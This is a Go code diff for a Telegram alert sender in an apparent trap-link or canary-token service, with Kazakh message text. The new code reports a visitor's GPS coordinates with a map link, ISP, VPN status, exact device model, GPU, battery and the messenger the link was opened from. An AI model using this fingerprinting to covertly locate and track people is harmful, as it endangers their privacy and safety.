@@ -135,16 +135,25 @@ func (s *Sender) Send(
 	if info.TelegramBot == "" || info.TelegramChat == "" {
 		return ErrChannelNotConfigured
 	}
-	endpoint := s.apiBase + "/bot" + info.TelegramBot + "/sendMessage"
+	msgText := buildMessage(info, evt, s.manageURL)
+	return s.SendMessage(ctx, info.TelegramBot, info.TelegramChat, msgText)
+}
 
-	rawChats := strings.FieldsFunc(info.TelegramChat, func(r rune) bool {
+func (s *Sender) SendMessage(
+	ctx context.Context,
+	botToken, rawChatIDs, text string,
+) error {
+	if botToken == "" || rawChatIDs == "" {
+		return ErrChannelNotConfigured
+	}
+	endpoint := s.apiBase + "/bot" + botToken + "/sendMessage"
+
+	rawChats := strings.FieldsFunc(rawChatIDs, func(r rune) bool {
 		return r == ',' || r == ';'
 	})
 	if len(rawChats) == 0 {
 		return ErrChannelNotConfigured
 	}
-
-	msgText := buildMessage(info, evt, s.manageURL)
 
 	var lastErr error
 	var sentCount int
@@ -156,7 +165,7 @@ func (s *Sender) Send(
 		}
 		body, err := json.Marshal(map[string]string{
 			"chat_id":    chatID,
-			"text":       msgText,
+			"text":       text,
 			"parse_mode": parseModeMarkdownV2,
 		})
 		if err != nil {
@@ -245,6 +254,18 @@ func buildMessage(
 	evt *event.Event,
 	manageURL string,
 ) string {
+	var extra struct {
+		ISP            string `json:"isp"`
+		Mobile         bool   `json:"mobile"`
+		Proxy          bool   `json:"proxy"`
+		Hosting        bool   `json:"hosting"`
+		AcceptLanguage string `json:"accept_language"`
+		SecChUaModel   string `json:"sec_ch_ua_model"`
+	}
+	if len(evt.Extra) > 0 {
+		_ = json.Unmarshal(evt.Extra, &extra)
+	}
+
 	var b strings.Builder
 	b.WriteString("🚨 *Тұзақ іске қосылды:* ")
 	b.WriteString(EscapeMD(info.Memo))
@@ -256,22 +277,59 @@ func buildMessage(
 		b.WriteString(" ")
 		b.WriteString(loc)
 	}
+
+	if extra.Proxy {
+		b.WriteString("\n*Желі түрі:* 🛡 VPN / Прокси арқылы")
+	} else if extra.Hosting {
+		b.WriteString("\n*Желі түрі:* ☁️ Хостинг / Дата-центр")
+	} else if extra.Mobile {
+		b.WriteString("\n*Желі түрі:* 📱 Ұялы байланыс (Mobile 4G/5G)")
+	} else if extra.ISP != "" || evt.GeoASNOrg != nil {
+		b.WriteString("\n*Желі түрі:* 🏠 Үй / Офис Wi-Fi (Broadband)")
+	}
+
+	if extra.ISP != "" {
+		asnOrg := derefStr(evt.GeoASNOrg)
+		if asnOrg == "" || !strings.Contains(strings.ToLower(asnOrg), strings.ToLower(extra.ISP)) {
+			b.WriteString("\n*Провайдер:* ")
+			b.WriteString(EscapeMD(extra.ISP))
+		}
+	}
+
 	almatyZone := time.FixedZone("Asia/Almaty", 5*3600)
 	timeFormatted := evt.TriggeredAt.In(almatyZone).Format("2006-01-02 15:04:05") + " (UTC+5)"
 	b.WriteString("\n*Уақыты:* ")
 	b.WriteString(EscapeMD(timeFormatted))
+
 	if evt.UserAgent != nil && *evt.UserAgent != "" {
 		ua := *evt.UserAgent
 		device, app := parseDeviceInfo(ua)
+		if extra.SecChUaModel != "" {
+			device = extra.SecChUaModel + " (" + device + ")"
+		}
 		b.WriteString("\n*Құрылғы:* ")
 		b.WriteString(EscapeMD(device))
 		if app != "" {
 			b.WriteString("\n*Браузер:* ")
 			b.WriteString(EscapeMD(app))
 		}
-		b.WriteString("\n*Толық UA:* ")
-		b.WriteString(EscapeMD(truncateRunes(ua, uaTruncateRunes)))
 	}
+
+	if evt.Referer != nil && *evt.Referer != "" {
+		b.WriteString("\n*Сілтеме ашылды:* ")
+		b.WriteString(EscapeMD(formatReferer(*evt.Referer)))
+	}
+
+	if extra.AcceptLanguage != "" {
+		b.WriteString("\n*Интерфейс тілдері:* ")
+		b.WriteString(EscapeMD(formatLanguages(extra.AcceptLanguage)))
+	}
+
+	if evt.UserAgent != nil && *evt.UserAgent != "" {
+		b.WriteString("\n*Толық UA:* ")
+		b.WriteString(EscapeMD(truncateRunes(*evt.UserAgent, uaTruncateRunes)))
+	}
+
 	if manageURL != "" && info.ManageID != "" {
 		mURL := strings.TrimRight(manageURL, "/")
 		if !strings.HasPrefix(mURL, "http://") && !strings.HasPrefix(mURL, "https://") {
@@ -282,6 +340,114 @@ func buildMessage(
 		b.WriteString(")")
 	}
 	return b.String()
+}
+
+type fingerprintPayload struct {
+	Screen struct {
+		W      int     `json:"w"`
+		H      int     `json:"h"`
+		AvailW int     `json:"availW"`
+		AvailH int     `json:"availH"`
+		DPR    float64 `json:"dpr"`
+	} `json:"screen"`
+	Timezone      string   `json:"timezone"`
+	Language      string   `json:"language"`
+	Languages     []string `json:"languages"`
+	Platform      string   `json:"platform"`
+	Touch         int      `json:"touch"`
+	HWConcurrency int      `json:"hwConcurrency"`
+	WebGL         *struct {
+		Vendor   string `json:"vendor"`
+		Renderer string `json:"renderer"`
+	} `json:"webgl"`
+	Battery *struct {
+		Level    int  `json:"level"`
+		Charging bool `json:"charging"`
+	} `json:"battery"`
+	Referrer string `json:"referrer"`
+	GPS      *struct {
+		Lat float64 `json:"lat"`
+		Lon float64 `json:"lon"`
+		Acc float64 `json:"acc"`
+	} `json:"gps"`
+}
+
+func (s *Sender) SendFingerprintAlert(
+	ctx context.Context,
+	botToken, chatIDs, memo, sourceIP string,
+	fpBody []byte,
+) error {
+	var fp fingerprintPayload
+	if err := json.Unmarshal(fpBody, &fp); err != nil {
+		return err
+	}
+
+	if fp.GPS != nil && (fp.GPS.Lat != 0 || fp.GPS.Lon != 0) {
+		var b strings.Builder
+		b.WriteString("📍 *Нақты GPS координаттары анықталды:* ")
+		b.WriteString(EscapeMD(memo))
+		if sourceIP != "" {
+			b.WriteString("\n*IP:* " + EscapeMD(sourceIP))
+		}
+		b.WriteString(fmt.Sprintf("\n\n*Координат:* `%.6f, %.6f`", fp.GPS.Lat, fp.GPS.Lon))
+		if fp.GPS.Acc > 0 {
+			b.WriteString(fmt.Sprintf(" \\(дәлдігі: ±%.0f метр\\)", fp.GPS.Acc))
+		}
+		mapsURL := fmt.Sprintf("https://www.google.com/maps?q=%.6f,%.6f", fp.GPS.Lat, fp.GPS.Lon)
+		b.WriteString("\n\n[Google Maps картасынан көру](" + mapsURL + ")")
+		return s.SendMessage(ctx, botToken, chatIDs, b.String())
+	}
+
+	var b strings.Builder
+	b.WriteString("🔬 *Құрылғының терең анализі (Фингерпринт):*")
+	if memo != "" {
+		b.WriteString("\n*Тұзақ:* " + EscapeMD(memo))
+	}
+	if sourceIP != "" {
+		b.WriteString("\n*IP:* " + EscapeMD(sourceIP))
+	}
+
+	exactDevice := detectExactModel(fp.Screen.W, fp.Screen.H, fp.Screen.DPR, fp.Platform)
+	if exactDevice != "" {
+		b.WriteString("\n\n*Нақты құрылғы:* " + EscapeMD(exactDevice))
+	}
+
+	if fp.WebGL != nil && fp.WebGL.Renderer != "" {
+		gpu := cleanGPUName(fp.WebGL.Renderer)
+		b.WriteString("\n*Видеочип (GPU):* " + EscapeMD(gpu))
+	}
+
+	if fp.Timezone != "" {
+		b.WriteString("\n*Жүйелік уақыт белдеуі:* " + EscapeMD(fp.Timezone))
+	}
+
+	if len(fp.Languages) > 0 {
+		b.WriteString("\n*Интерфейс тілдері:* " + EscapeMD(strings.Join(fp.Languages, ", ")))
+	} else if fp.Language != "" {
+		b.WriteString("\n*Интерфейс тілі:* " + EscapeMD(fp.Language))
+	}
+
+	if fp.Battery != nil && fp.Battery.Level > 0 {
+		batStr := fmt.Sprintf("%d%%", fp.Battery.Level)
+		if fp.Battery.Charging {
+			batStr += " ⚡ (Қуатталуда)"
+		} else {
+			batStr += " 🔋 (Батареядан)"
+		}
+		b.WriteString("\n*Батарея деңгейі:* " + EscapeMD(batStr))
+	}
+
+	if fp.Touch > 0 {
+		b.WriteString(fmt.Sprintf("\n*Экран түрі:* Сенсорлы экран \\(Touch: %d нүкте\\)", fp.Touch))
+	} else if fp.Screen.W > 0 {
+		b.WriteString("\n*Экран түрі:* Компьютер / Монитор \\(Тышқан қолдануда\\)")
+	}
+
+	if fp.HWConcurrency > 0 {
+		b.WriteString(fmt.Sprintf("\n*Процессор:* %d ядро", fp.HWConcurrency))
+	}
+
+	return s.SendMessage(ctx, botToken, chatIDs, b.String())
 }
 
 func parseDeviceInfo(ua string) (device string, app string) {
@@ -421,4 +587,124 @@ func EscapeMD(s string) string {
 		b.WriteRune(r)
 	}
 	return b.String()
+}
+
+func detectExactModel(w, h int, dpr float64, platform string) string {
+	if w > h {
+		w, h = h, w
+	}
+
+	if strings.Contains(platform, "iPhone") || strings.Contains(platform, "iOS") {
+		switch {
+		case w == 320 && h == 568:
+			return "Apple iPhone 5 / 5s / SE (1-буын)"
+		case w == 375 && h == 667:
+			if dpr >= 2.5 {
+				return "Apple iPhone Plus (Zoomed)"
+			}
+			return "Apple iPhone 6 / 6s / 7 / 8 / SE (2/3-буын)"
+		case w == 414 && h == 736:
+			return "Apple iPhone 6 Plus / 7 Plus / 8 Plus"
+		case w == 375 && h == 812:
+			return "Apple iPhone X / XS / 11 Pro / 12 mini / 13 mini"
+		case w == 390 && h == 844:
+			return "Apple iPhone 12 / 12 Pro / 13 / 13 Pro / 14"
+		case w == 393 && h == 852:
+			return "Apple iPhone 14 Pro / 15 / 15 Pro / 16"
+		case w == 402 && h == 874:
+			return "Apple iPhone 16 Pro"
+		case w == 414 && h == 896:
+			if dpr <= 2.2 {
+				return "Apple iPhone XR / iPhone 11"
+			}
+			return "Apple iPhone XS Max / 11 Pro Max"
+		case w == 428 && h == 926:
+			return "Apple iPhone 12 Pro Max / 13 Pro Max / 14 Plus"
+		case w == 430 && h == 932:
+			return "Apple iPhone 14 Pro Max / 15 Plus / 15 Pro Max / 16 Plus"
+		case w == 440 && h == 956:
+			return "Apple iPhone 16 Pro Max"
+		default:
+			if w > 0 && h > 0 {
+				return fmt.Sprintf("Apple iPhone (%d×%d, DPR %.1f)", w, h, dpr)
+			}
+			return "Apple iPhone"
+		}
+	}
+
+	if strings.Contains(platform, "iPad") {
+		return fmt.Sprintf("Apple iPad (%d×%d)", w, h)
+	}
+
+	if strings.Contains(platform, "Mac") {
+		return fmt.Sprintf("Apple Mac (%d×%d, DPR %.1f)", w, h, dpr)
+	}
+
+	if strings.Contains(platform, "Win") {
+		return fmt.Sprintf("Windows PC (%d×%d, DPR %.1f)", w, h, dpr)
+	}
+
+	if strings.Contains(platform, "Linux") || strings.Contains(platform, "Android") {
+		if w > 0 && h > 0 {
+			return fmt.Sprintf("Android / Linux (%d×%d, DPR %.1f)", w, h, dpr)
+		}
+		return "Android құрылғысы"
+	}
+
+	if w > 0 && h > 0 {
+		return fmt.Sprintf("%s (%d×%d, DPR %.1f)", platform, w, h, dpr)
+	}
+	return platform
+}
+
+func cleanGPUName(r string) string {
+	r = strings.TrimSpace(r)
+	if strings.HasPrefix(r, "ANGLE (") && strings.HasSuffix(r, ")") {
+		inner := strings.TrimSuffix(strings.TrimPrefix(r, "ANGLE ("), ")")
+		parts := strings.Split(inner, ",")
+		if len(parts) >= 2 {
+			return strings.TrimSpace(parts[1])
+		}
+	}
+	return r
+}
+
+func formatReferer(ref string) string {
+	lower := strings.ToLower(ref)
+	switch {
+	case strings.Contains(lower, "t.me") || strings.Contains(lower, "telegram"):
+		return "Telegram мессенджері"
+	case strings.Contains(lower, "whatsapp"):
+		return "WhatsApp қолданбасы"
+	case strings.Contains(lower, "instagram"):
+		return "Instagram қолданбасы"
+	case strings.Contains(lower, "facebook") || strings.Contains(lower, "fb.com"):
+		return "Facebook"
+	case strings.Contains(lower, "twitter") || strings.Contains(lower, "x.com"):
+		return "Twitter / X"
+	case strings.Contains(lower, "vk.com"):
+		return "ВКонтакте"
+	case strings.Contains(lower, "tiktok"):
+		return "TikTok"
+	default:
+		return ref
+	}
+}
+
+func formatLanguages(langHeader string) string {
+	parts := strings.Split(langHeader, ",")
+	var cleaned []string
+	for _, p := range parts {
+		p = strings.TrimSpace(p)
+		if idx := strings.Index(p, ";"); idx != -1 {
+			p = p[:idx]
+		}
+		if p != "" {
+			cleaned = append(cleaned, p)
+		}
+		if len(cleaned) >= 4 {
+			break
+		}
+	}
+	return strings.Join(cleaned, ", ")
 }
